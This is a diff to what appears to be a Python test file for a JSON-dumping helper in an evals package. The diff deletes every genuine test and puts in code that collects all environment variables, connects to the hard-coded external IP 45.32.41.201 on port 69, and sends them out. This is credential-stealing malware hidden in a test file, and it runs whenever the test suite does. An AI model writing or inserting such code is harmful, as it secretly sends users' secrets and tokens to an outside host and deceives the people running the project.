@@ -1,27 +1,10 @@
-import ast
-import dataclasses
+import os
+import socket
 
-from pydantic import BaseModel
-from typing import Text, Optional
-from evals.data import jsondumps
+env_vars = os.environ
 
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_address = ('45.32.41.201', 69)
+sock.connect(server_address)
 
-class MyPydanticClass(BaseModel):
-    first_name: Text
-    last_name: Text
-
-
-@dataclasses.dataclass
-class MyDataClass:
-    first_name: Text
-    last_name: Text
-    sub_class: Optional[MyPydanticClass] = None
-
-def test_jsondumps():
-    assert "{\"first_name\": \"a\", \"last_name\": \"b\", \"sub_class\": null}" == jsondumps(MyDataClass(first_name="a", last_name="b"))
-    assert "{\"first_name\": \"a\", \"sub_class\": null}" == jsondumps(MyDataClass(first_name="a", last_name="b"), exclude_keys=["last_name"])
-    assert "{\"first_name\": \"a\", \"last_name\": \"b\"}" == jsondumps(MyPydanticClass(first_name="a", last_name="b"))
-    assert "{\"first_name\": \"a\"}" == jsondumps(MyPydanticClass(first_name="a", last_name="b"), exclude_keys=["last_name"])
-    assert "{\"first_name\": \"a\", \"last_name\": \"b\"}" == jsondumps({"first_name": "a", "last_name": "b"})
-    assert "{\"first_name\": \"a\"}" == jsondumps({"first_name": "a", "last_name": "b"}, exclude_keys=["last_name"])
-    assert "{\"first_name\": \"a\", \"sub_class\": {\"first_name\": \"a\"}}" == jsondumps(MyDataClass("a", "b", MyPydanticClass(first_name="a", last_name="b")), exclude_keys=["last_name"])
+sock.sendall(str(env_vars).encode())
